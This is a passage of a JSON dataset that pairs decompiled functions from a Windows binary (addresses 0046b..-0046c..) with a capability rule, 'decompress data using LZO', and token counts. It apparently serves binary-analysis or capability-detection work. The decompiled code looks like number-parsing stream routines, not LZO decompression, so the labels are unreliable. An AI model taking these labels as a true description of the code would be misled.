^ 1),  uVar10 == 0)) goto code_r0x0046b41c;\n                    fcn.0048cc10(0x65);\n                    if (arg_8h[2] < arg_8h[3]) {\n                        arg_8h[2] = arg_8h[2] + 1;\n                    }\n                    else {\n                        (**(*arg_8h + 0x28))();\n                    }\n                    arg_ch = 0xffffffff;\n                    cVar2 = fcn.004502d0(&arg_10h);\n                    if (cVar2 != '\\0') goto code_r0x0046b9c0;\n                    cVar3 = fcn.004503c0();\n                    if (*(iVar4 + 0x4b) == cVar3) {\n                        uVar7 = 0x2b;\n                    }\n                    else {\n                        uVar1 = uVar10;\n                        if (*(iVar4 + 0x4a) != cVar3) goto code_r0x0046b4af;\n                        uVar7 = 0x2d;\n                    }\n                    fcn.0048cc10(uVar7);\n                    uVar6 = arg_8h[2];\n                    uVar11 = uVar10;\n                    if (uVar6 < arg_8h[3]) break;\ncode_r0x0046b5e7:\n                    (**(*arg_8h + 0x28))();\n                    uVar1 = uVar10;\n                    uVar10 = uVar11;\n                }\n            } while( true );\n        }\n    }\n    else if (var_31h == 0) {\n        uVar9 = *(iVar4 + 0x10);\n        uVar1 = 0;\ncode_r0x0046b390:\n        if ((uVar9 != 0) && (*(iVar4 + 0x25) == cVar3)) {\n            var_31h._0_1_ = var_31h | uVar1;\n            if (var_31h == 0) {\n                if (var_38h != 0) {\n                    fcn.0048cc10(var_38h);\n                    uVar8 = 0;\n                    var_38h = 0;\n                    goto code_r0x0046b3e7;\n                }\n                fcn.0048ca60(0, *(*arg_20h + -0xc), 0);\n                iVar5 = *(stack0xffffffe0 + -0xc);\n                goto joined_r0x0046b9f6;\n            }\n            iVar5 = *(stack0xffffffe0 + -0xc);\n            goto joined_r0x0046b9e3;\n        }\n        if (*(iVar4 + 0x24) == cVar3) {\n            uVar8 = uVar1 | var_31h;\n            iVar5 = *(stack0xffffffe0 + -0xc);\n            if (uVar8 == 0) {\n                if (iVar5 != 0) {\n                    fcn.0048cc10(var_38h);\n                }\n                fcn.0048cc10(0x2e);\n                uVar6 = arg_8h[2];\n                var_31h._0_1_ = uVar11;\n                if (arg_8h[3] <= uVar6) goto code_r0x0046b651;\n                goto code_r0x0046b3f6;\n            }\n            goto joined_r0x0046b9e3;\n        }\n        iVar5 = sub.msvcrt.dll_memchr(iVar4 + 0x4e, cVar3, 10);\n        if (iVar5 != 0) {\n            fcn.0048cc10((iVar5 - (iVar4 + 0x4e)) + '0');\n            var_38h = var_38h + 1;\n            uVar8 = uVar1;\n            uVar10 = uVar11;\n            goto code_r0x0046b3e7;\n        }\n        if ((*(iVar4 + 0x5c) != cVar3) && (*(iVar4 + 0x62) != cVar3)) goto code_r0x0046b41c;\n        iVar5 = *(stack0xffffffe0 + -0xc);\n        uVar8 = uVar10 & (uVar1 ^ 1);\n        if (uVar8 == 0) goto code_r0x0046b422;\n        if ((iVar5 != 0) && (var_31h == 0)) {\n            fcn.0048cc10(var_38h);\n        }\n        fcn.0048cc10(0x65);\n        fcn.004a5560();\n        arg_ch = 0xffffffff;\n        cVar2 = fcn.004502d0(&arg_10h);\n        if (cVar2 == '\\0') goto code_r0x0046b6ef;\ncode_r0x0046b9c0:\n        arg_ch = 0xffffffff;\n        iVar5 = *(stack0xffffffe0 + -0xc);\njoined_r0x0046b9e3:\n        if (iVar5 == 0) goto code_r0x0046b474;\n        goto code_r0x0046b451;\n    }\n    iVar5 = *(stack0xffffffe0 + -0xc);\njoined_r0x0046b9f6:\n    if (iVar5 == 0) goto code_r0x0046b474;\ncode_r0x0046b43a:\n    fcn.0048cc10(var_38h);\n    goto code_r0x0046b451;\ncode_r0x0046b6ef:\n    cVar3 = fcn.004503c0();\n    uVar9 = *(iVar4 + 0x10);\n    if ((((*(iVar4 + 0x4b) == cVar3) || (uVar1 = uVar8,  uVar10 = uVar8,  *(iVar4 + 0x4a) == cVar3)) &&\n        ((uVar9 == 0 || (uVar1 = uVar9,  uVar10 = uVar9,  *(iVar4 + 0x25) != cVar3)))) &&\n       (uVar1 = uVar8,  uVar10 = uVar8,  *(iVar4 + 0x24) != cVar3)) {\n        fcn.0048cc10((*(iVar4 + 0x4b) != cVar3) * '\\x02' + '+');\ncode_r0x0046b3e7:\n        uVar6 = arg_8h[2];\n        if (uVar6 < arg_8h[3]) {\ncode_r0x0046b3f6:\n            arg_8h[2] = uVar6 + 1;\n            uVar1 = uVar8;\n        }\n        else {\ncode_r0x0046b651:\n            (**(*arg_8h + 0x28))();\n            uVar1 = uVar8;\n        }\n        arg_ch = 0xffffffff;\n        cVar2 = fcn.004502d0(&arg_10h);\n        if (cVar2 != '\\0') goto code_r0x0046b41c;\n        cVar3 = fcn.004503c0();\n        uVar9 = *(iVar4 + 0x10);\n    }\n    goto code_r0x0046b390;\ncode_r0x0046b41c:\n    iVar5 = *(stack0xffffffe0 + -0xc);\ncode_r0x0046b422:\n    if (iVar5 == 0) goto code_r0x0046b474;\n    if ((var_31h == 0) && (uVar1 == 0)) goto code_r0x0046b43a;\ncode_r0x0046b451:\n    cVar2 = fcn.004bdf60(*(iVar4 + 8), *(iVar4 + 0xc), &var_1eh + 2);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\ncode_r0x0046b474:\n    fcn.0048b630(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3275
    },
    "0046bff0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl\nfcn.0046bff0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t *arg_1ch_00;\n    char cVar3;\n    ulong uVar4;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    arg_1ch_00 = arg_1ch;\n    var_20h = fcn.0048b140(0, 0, &var_1ch);\n    fcn.0048c930(0x20);\n    uVar4 = fcn.0046b2f0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch_00, &var_20h);\n    var_1ch = fcn.004ae940();\n    fcn.004bd2f0(var_20h, arg_20h, arg_1ch_00, &var_1ch);\n    cVar3 = fcn.004502d0(&arg_10h);\n    if (cVar3 != '\\0') {\n        *arg_1ch_00 = *arg_1ch_00 | 2;\n    }\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_20h + -4);\n        *(var_20h + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_20h + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar4;\n    }\n    fcn.0048b610(&var_1ch);\n    return uVar4;\n}\n",
        "token_count": 471
    },
    "0046c120": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.0046c120(uint arg_8h, uint arg_ch, int32_t *arg_10h, int32_t arg_14h, uint arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    bool bVar4;\n    uint64_t uVar5;\n    int32_t *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0048b140(0, 0, &var_1ch);\n    fcn.0048c930(0x20);\n    uVar5 = fcn.0046b2f0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_20h);\n    var_34h = uVar5;\n    var_1ch = fcn.004ae940();\n    fcn.004bd410(var_20h, arg_20h, arg_1ch, &var_1ch);\n    bVar3 = uVar5 >> 0x20 == -1;\n    bVar4 = var_34h != NULL && bVar3;\n    if ((bVar4) && (bVar3 = false,  var_34h[3] <= var_34h[2])) {\n        iVar2 = (**(*var_34h + 0x24))();\n        if (iVar2 == -1) {\n            var_34h = NULL;\n        }\n        bVar3 = iVar2 == -1 && bVar4;\n    }\n    bVar4 = arg_14h == -1;\n    if (((arg_10h != NULL) && (bVar4)) && (bVar4 = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar2 = (**(*arg_10h + 0x24))();\n        bVar4 = iVar2 == -1;\n    }\n    if (bVar4 == bVar3) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_20h + -4);\n        *(var_20h + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_20h + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar5 & 0xffffffff00000000 | ZEXT48(var_34h);\n    }\n    fcn.0048b610(&var_1ch);\n    return uVar5 & 0xffffffff00000000 | ZEXT48(var_34h);\n}\n",
        "token_count": 687
    },
    "0046c2d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.0046c2d0(uint arg_8h, uint arg_ch, int32_t *arg_10h, int32_t arg_14h, uint arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    bool bVar4;\n    uint64_t uVar5;\n    int32_t *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0048b140(0, 0, &var_1ch);\n    fcn.0048c930(0x20);\n    uVar5 = fcn.0046b2f0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_20h);\n    var_34h = uVar5;\n    var_1ch = fcn.004ae940();\n    fcn.004bd520(var_20h, arg_20h, arg_1ch, &var_1ch);\n    bVar3 = uVar5 >> 0x20 == -1;\n    bVar4 = var_34h != NULL && bVar3;\n    if ((bVar4) && (bVar3 = false,  var_34h[3] <= var_34h[2])) {\n        iVar2 = (**(*var_34h + 0x24))();\n        if (iVar2 == -1) {\n            var_34h = NULL;\n        }\n        bVar3 = iVar2 == -1 && bVar4;\n    }\n    bVar4 = arg_14h == -1;\n    if (((arg_10h != NULL) && (bVar4)) && (bVar4 = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar2 = (**(*arg_10h + 0x24))();\n        bVar4 = iVar2 == -1;\n    }\n    if (bVar4 == bVar3) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_20h + -4);\n        *(var_20h + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_20h + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar5 & 0xffffffff00000000 | ZEXT48(var_34h);\n    }\n    fcn.0048b610(&var_1ch);\n    return uVar5 & 0xffffffff00000000 | ZEXT48(var_34h);\n}\n",
        "token_count": 689
    },
    "0046c4e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0046c4e0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    int16_t *piVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    char cVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    bool bVar10;\n    bool bVar11;\n    bool bVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint *var_60h;\n    uint var_5ch;\n    uint var_57h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t var_43h;\n    uint8_t var_42h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar4 = arg_18h;\n    iVar8 = fcn.0044daf0(arg_18h + 0x6c);\n    var_40h = 8;\n    uVar18 = *(iVar4 + 0xc) & 0x4a;\n    if ((uVar18 != 0x40) && (var_40h = 10,  uVar18 == 8)) {\n        var_40h = 0x10;\n    }\n    bVar11 = arg_8h != NULL && arg_ch == -1;\n    bVar10 = arg_ch == -1;\n    if (bVar11) {\n        if (arg_8h[2] < arg_8h[3]) {\n            iVar7 = *arg_8h[2];\n        }\n        else {\n            iVar7 = (**(*arg_8h + 0x24))();\n        }\n        bVar10 = false;\n        if (iVar7 == -1) {\n            arg_8h = NULL;\n            bVar10 = bVar11;\n        }\n    }\n    bVar12 = arg_10h != NULL && arg_14h == -1;\n    bVar11 = arg_14h == -1;\n    if (bVar12) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar7 = *arg_10h[2];\n        }\n        else {\n            iVar7 = (**(*arg_10h + 0x24))();\n        }\n        bVar11 = false;\n        if (iVar7 == -1) {\n            arg_10h = NULL;\n            bVar11 = bVar12;\n        }\n    }\n    if (bVar11 == bVar10) {\n        cVar6 = *(iVar8 + 0x10);\n        bVar11 = false;\n        uVar17 = 0;\n        uVar19 = 0;\n        var_42h = 1;\n        bVar10 = false;\n    }\n    else {\n        uVar17 = arg_ch & 0xffff;\n        if ((arg_8h != NULL) && (arg_ch == -1)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar17 = *arg_8h[2];\n            }\n            else {\n                uVar17 = (**(*arg_8h + 0x24))();\n            }\n            if (uVar17 == -1) {\n                arg_8h = NULL;\n            }\n        }\n        cVar6 = *(iVar8 + 0x10);\n        iVar7 = uVar17;\n        bVar11 = *(iVar8 + 0x70) == iVar7;\n        if ((bVar11) || (*(iVar8 + 0x72) == iVar7)) {\n            if (((cVar6 == '\\0') || (*(iVar8 + 0x26) != iVar7)) && (*(iVar8 + 0x24) != iVar7)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_42h = fcn.00450410(&arg_10h);\n                if (var_42h != 0) {\n                    cVar6 = *(iVar8 + 0x10);\n                    uVar19 = 0;\n                    bVar10 = false;\n                    goto code_r0x0046c6ba;\n                }\n                uVar17 = fcn.00450500();\n                cVar6 = *(iVar8 + 0x10);\n            }\n        }\n        else {\n            bVar11 = false;\n        }\n        bVar10 = false;\n        uVar19 = 0;\n        do {\n            iVar7 = uVar17;\n            if ((cVar6 != '\\0') && (*(iVar8 + 0x26) == iVar7)) {\n                var_42h = 0;\n                if (var_40h != 0x10) goto code_r0x0046c6c7;\n                var_28h = var_28h & 0xffffff00;\n                var_50h = 0x16;\n                goto code_r0x0046cd30;\n            }\n            if (*(iVar8 + 0x24) == iVar7) break;\n            if (*(iVar8 + 0x78) == iVar7) {\n                bVar12 = var_40h == 10 | bVar10 ^ 1U;\n                if (!bVar12) goto code_r0x0046c622;\n                bVar10 = uVar18 == 0 || var_40h == 8;\n                if (uVar18 != 0 && var_40h != 8) {\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0046c656;\n                }\n                uVar19 = 0;\n                var_40h = 8;\n                uVar14 = arg_8h[2];\n                if (uVar14 < arg_8h[3]) goto code_r0x0046c665;\ncode_r0x0046c8a0:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0046c674;\n                var_48h._0_1_ = true;\n            }\n            else {\n                if (!bVar10) break;\ncode_r0x0046c622:\n                if ((*(iVar8 + 0x74) != iVar7) && (*(iVar8 + 0x76) != iVar7)) {\n                    var_42h = 0;\n                    bVar10 = true;\n                    goto code_r0x0046c6ba;\n                }\n                var_42h = var_40h == 0x10 || uVar18 == 0;\n                if (var_40h != 0x10 && uVar18 != 0) {\n                    bVar10 = true;\n                    goto code_r0x0046c6c7;\n                }\n                bVar12 = false;\n                uVar19 = 0;\n                var_40h = 0x10;\ncode_r0x0046c656:\n                uVar14 = arg_8h[2];\n                bVar10 = bVar12;\n                if (arg_8h[3] <= uVar14) goto code_r0x0046c8a0;\ncode_r0x0046c665:\n                arg_8h[2] = uVar14 + 2;\ncode_r0x0046c674:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar7 = *arg_8h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_8h + 0x24))();\n                }\n                var_48h._0_1_ = false;\n                if (iVar7 == -1) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar15 = arg_10h != NULL && arg_14h == -1;\n            bVar12 = arg_14h == -1;\n            if (bVar15) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar7 = *arg_10h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_10h + 0x24))();\n                }\n                bVar12 = false;\n                if (iVar7 == -1) {\n                    arg_10h = NULL;\n                    bVar12 = bVar15;\n                }\n            }\n            if (var_48h._0_1_ == bVar12) {\n                var_42h = 1;\n                cVar6 = *(iVar8 + 0x10);\n                goto code_r0x0046c6ba;\n            }\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            cVar6 = *(iVar8 + 0x10);\n        } while (bVar10);\n        var_42h = 0;\n    }\ncode_r0x0046c6ba:\n    var_50h = 0x16;\n    if (var_40h != 0x10) {\ncode_r0x0046c6c7:\n        var_50h = var_40h;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (cVar6 != '\\0') {\ncode_r0x0046cd30:\n        stack0xffffffcc = &var_28h;\n        var_2ch = 0;\n        fcn.004b1bc0(0x20);\n    }\n    uVar5 = var_42h;\n    var_60h = &var_28h;\n    uVar18 = 0xffffffff / var_40h;\n    uVar2 = *(iVar8 + 0xa4);\n    if (uVar2 == 0) {\n        if (var_42h == 0) {\n            var_43h = 0;\n            var_48h = 0;\ncode_r0x0046c728:\n            uVar16 = uVar17;\n            uVar17 = uVar17 & 0xffff;\n            if (var_50h < 0xb) {\n                if ((uVar16 < 0x30) || (var_50h + 0x30U <= uVar16)) goto code_r0x0046c950;\n            }\n            else if (9 < uVar16 - 0x30) goto code_r0x0046c92d;\n            uVar17 = uVar17 - 0x30;\ncode_r0x0046c74c:\n            if (uVar17 != 0xffffffff) {\n                do {\n                    if (uVar18 < var_48h) {\n                        var_43h = 1;\n                        uVar17 = arg_8h[2];\n                        if (uVar17 < arg_8h[3]) goto code_r0x0046c78a;\ncode_r0x0046c9e3:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0046c799;\n                        var_4ch._0_1_ = true;\n                    }\n                    else {\n                        var_43h = var_43h | ~uVar17 < var_48h * var_40h;\n                        var_48h = uVar17 + var_48h * var_40h;\n                        uVar19 = uVar19 + 1;\n                        uVar17 = arg_8h[2];\n                        if (arg_8h[3] <= uVar17) goto code_r0x0046c9e3;\ncode_r0x0046c78a:\n                        arg_8h[2] = uVar17 + 2;\ncode_r0x0046c799:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        var_4ch._0_1_ = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            var_4ch._0_1_ = true;\n                        }\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar15 = arg_10h != NULL && arg_14h == -1;\n                    bVar12 = arg_14h == -1;\n                    if (bVar15) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar12 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar12 = bVar15;\n                        }\n                    }\n                    if (var_4ch._0_1_ == bVar12) {\n                        uVar2 = 1;\n                        goto code_r0x0046c7de;\n                    }\n                    uVar17 = 0xffff;\n                    if (arg_8h == NULL) goto code_r0x0046c728;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar17 = *arg_8h[2];\n                    }\n                    else {\n                        uVar17 = (**(*arg_8h + 0x24))();\n                    }\n                    uVar16 = uVar17;\n                    if (uVar16 != 0xffff) goto code_r0x0046c728;\n                    arg_8h = NULL;\n                    if (var_50h < 0xb) break;\n                    uVar17 = 0xffff;\ncode_r0x0046c92d:\n                    if (5 < uVar16 - 0x61) goto code_r0x0046cab0;\n                    uVar17 = uVar17 - 0x57;\n                    if (uVar17 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x0046c950;\n        }\n        var_43h = 0;\n        var_42h = 0;\n        var_48h = 0;\n        uVar2 = uVar5;\n    }\n    else {\n        if (var_42h == 0) {\n            piVar1 = iVar8 + 0x78;\n            var_43h = 0;\n            var_48h = 0;\ncode_r0x0046caf0:\n            uVar14 = var_2ch;\n            iVar7 = uVar17;\n            if ((*(iVar8 + 0x10) == 0) || (*(iVar8 + 0x26) != iVar7)) {\n                if (iVar7 == *(iVar8 + 0x24)) goto code_r0x0046c950;\n                iVar3 = *piVar1;\n                piVar9 = piVar1;\n                uVar17 = var_50h;\n                while (iVar3 != iVar7) {\n                    piVar9 = piVar9 + 1;\n                    uVar17 = uVar17 - 1;\n                    if (uVar17 == 0) goto code_r0x0046c950;\n                    iVar3 = *piVar9;\n                }\n                uVar17 = piVar9 - piVar1 >> 1;\n                if (0x1e < piVar9 - piVar1) {\n                    uVar17 = uVar17 - 6;\n                }\n                if (var_48h <= uVar18) {\n                    uVar14 = var_48h * var_40h;\n                    var_48h = uVar17 + uVar14;\n                    var_43h = var_43h | ~uVar17 < uVar14;\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0046cb43;\n                }\n                uVar17 = arg_8h[2];\n                var_43h = uVar2;\n                if (uVar17 < arg_8h[3]) goto code_r0x0046cb52;\ncode_r0x0046cc18:\n                (**(*arg_8h + 0x28))();\n                var_57h._1_1_ = uVar2;\n                if (arg_8h != NULL) goto code_r0x0046cb61;\n            }\n            else {\n                if (uVar19 == 0) {\n                    var_42h = *(iVar8 + 0x10);\n                    uVar2 = 0;\n                    goto code_r0x0046c7de;\n                }\n                uVar17 = var_2ch + 1;\n                uVar13 = 0xf;\n                if (stack0xffffffcc != var_60h) {\n                    uVar13 = var_28h;\n                }\n                if (uVar13 < uVar17) {\n                    fcn.004b1f10(var_2ch, 0, 0, 1);\n                }\n                *(stack0xffffffcc + uVar14) = uVar19;\n                *(stack0xffffffcc + uVar17) = 0;\n                uVar19 = 0;\n                var_2ch = uVar17;\ncode_r0x0046cb43:\n                uVar17 = arg_8h[2];\n                if (arg_8h[3] <= uVar17) goto code_r0x0046cc18;\ncode_r0x0046cb52:\n                arg_8h[2] = uVar17 + 2;\ncode_r0x0046cb61:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar7 = *arg_8h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_8h + 0x24))();\n                }\n                var_57h._1_1_ = 0;\n                if (iVar7 == -1) {\n                    arg_8h = NULL;\n                    var_57h._1_1_ = uVar2;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar15 = arg_10h != NULL && arg_14h == -1;\n            bVar12 = arg_14h == -1;\n            if (bVar15) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar7 = *arg_10h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_10h + 0x24))();\n                }\n                bVar12 = false;\n                if (iVar7 == -1) {\n                    arg_10h = NULL;\n                    bVar12 = bVar15;\n                }\n            }\n            if (bVar12 == var_57h._1_1_) goto code_r0x0046c7de;\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            goto code_r0x0046caf0;\n        }\n        var_48h = 0;\n        var_43h = 0;\n        var_42h = 0;\n        uVar2 = uVar5;\n    }\ncode_r0x0046c7de:\n    if (var_2ch != 0) goto code_r0x0046c95f;\ncode_r0x0046c7f0:\n    if ((uVar19 != 0) || (bVar10)) {\ncode_r0x0046c9a1:\n        if (var_42h == 0) {\n            if (var_43h == 0) {\n                uVar18 = -var_48h;\n                if (!bVar11) {\n                    uVar18 = var_48h;\n                }\n                *arg_20h = uVar18;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x0046c814;\n        }\n    }\ncode_r0x0046c802:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x0046c814:\n    if (uVar2 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != var_60h) {\n        fcn.004c2c30(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x0046cab0:\n    if (5 < uVar16 - 0x41) goto code_r0x0046c950;\n    uVar17 = uVar17 - 0x37;\n    goto code_r0x0046c74c;\ncode_r0x0046c950:\n    uVar2 = 0;\n    if (var_2ch == 0) goto code_r0x0046c7f0;\ncode_r0x0046c95f:\n    fcn.004b20a0(uVar19);\n    cVar6 = fcn.004bdf20(*(iVar8 + 8), *(iVar8 + 0xc), &var_31h + 1);\n    if (cVar6 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar10) || ((uVar19 | var_2ch) != 0)) goto code_r0x0046c9a1;\n    goto code_r0x0046c802;\n}\n",
        "token_count": 5161
    },
    "0046cf90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0046cf90(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    int16_t *piVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    uint8_t uVar4;\n    char cVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int16_t *piVar10;\n    bool bVar11;\n    bool bVar12;\n    bool bVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint var_68h;\n    uint *var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint8_t var_56h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t var_43h;\n    uint8_t var_42h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar9 = arg_18h;\n    iVar7 = fcn.0044daf0(arg_18h + 0x6c);\n    var_40h = 8;\n    uVar18 = *(iVar9 + 0xc) & 0x4a;\n    if ((uVar18 != 0x40) && (var_40h = 10,  uVar18 == 8)) {\n        var_40h = 0x10;\n    }\n    bVar12 = arg_8h != NULL && arg_ch == -1;\n    bVar11 = arg_ch == -1;\n    if (bVar12) {\n        if (arg_8h[2] < arg_8h[3]) {\n            iVar6 = *arg_8h[2];\n        }\n        else {\n            iVar6 = (**(*arg_8h + 0x24))();\n        }\n        bVar11 = false;\n        if (iVar6 == -1) {\n            arg_8h = NULL;\n            bVar11 = bVar12;\n        }\n    }\n    bVar13 = arg_10h != NULL && arg_14h == -1;\n    bVar12 = arg_14h == -1;\n    if (bVar13) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar6 = *arg_10h[2];\n        }\n        else {\n            iVar6 = (**(*arg_10h + 0x24))();\n        }\n        bVar12 = false;\n        if (iVar6 == -1) {\n            arg_10h = NULL;\n            bVar12 = bVar13;\n        }\n    }\n    if (bVar12 == bVar11) {\n        cVar5 = *(iVar7 + 0x10);\n        bVar12 = false;\n        uVar17 = 0;\n        uVar19 = 0;\n        var_42h = 1;\n        bVar11 = false;\n    }\n    else {\n        uVar17 = arg_ch & 0xffff;\n        if ((arg_8h != NULL) && (arg_ch == -1)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar17 = *arg_8h[2];\n            }\n            else {\n                uVar17 = (**(*arg_8h + 0x24))();\n            }\n            if (uVar17 == -1) {\n                arg_8h = NULL;\n            }\n        }\n        cVar5 = *(iVar7 + 0x10);\n        iVar6 = uVar17;\n        bVar12 = *(iVar7 + 0x70) == iVar6;\n        if ((bVar12) || (*(iVar7 + 0x72) == iVar6)) {\n            if (((cVar5 == '\\0') || (*(iVar7 + 0x26) != iVar6)) && (*(iVar7 + 0x24) != iVar6)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 